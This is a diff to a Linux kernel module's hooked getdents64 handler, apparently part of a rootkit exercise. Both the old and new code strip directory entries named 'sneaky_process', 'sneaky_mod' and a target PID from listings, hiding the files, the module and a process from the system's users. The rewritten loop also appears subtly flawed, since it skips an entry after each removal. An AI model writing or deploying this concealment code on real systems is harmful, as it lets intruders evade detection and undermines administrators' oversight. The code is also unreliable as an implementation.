@@ -119,33 +119,24 @@ asmlinkage int (*original_getdents64)(struct pt_regs *);
 
 asmlinkage int fake_getdents64(struct pt_regs *regs)
 {
-  int res;
-  struct linux_dirent64 *dirp, *cur_dirp;
-  long bytes_len;
-  char *next_dirp;
+  ssize_t res;
+  ssize_t bytes_len;
+  struct linux_dirent64 * drip;
 
-  res = (*original_getdents64)(regs);
-  if (res <= 0)
-  {
-    return res;
-  }
-  dirp = (struct linux_dirent64 *)regs->si;
-  bytes_len = res;
+  res = original_getdents64(regs);
 
-  while (bytes_len > 0)
-  {
-    cur_dirp = dirp;
-    next_dirp = (char *)dirp + dirp->d_reclen;
-    bytes_len -= dirp->d_reclen;
-    // Check if the d_name should be hidden
-    if (strcmp(PREFIX, cur_dirp->d_name) == 0 || strcmp("sneaky_mod", cur_dirp->d_name) == 0 || (pid != -1 && strcmp(cur_dirp->d_name, pid) == 0))
-    {
-      memmove(cur_dirp, next_dirp, bytes_len);
-      res -= cur_dirp->d_reclen;
-      continue;
+  for(bytes_len=0; bytes_len<res;){
+    drip = (struct linux_dirent64 *)((char *)regs->si + bytes_len);
+    if (strcmp(drip->d_name, "sneaky_process") == 0 || strcmp(drip->d_name, "sneaky_mod") == 0 || strcmp(drip->d_name, pid) == 0){
+      int cur_len = drip->d_reclen;
+      int left = ((char *)regs->si + res - (char *)drip -cur_len);
+      void* next_drip = (char *)drip + cur_len;
+      memmove(drip, next_drip, left);
+      res -= cur_len;
     }
-    dirp = (struct linux_dirent64 *)next_dirp;
+    bytes_len += drip->d_reclen;
   }
+
   return res;
 }
 
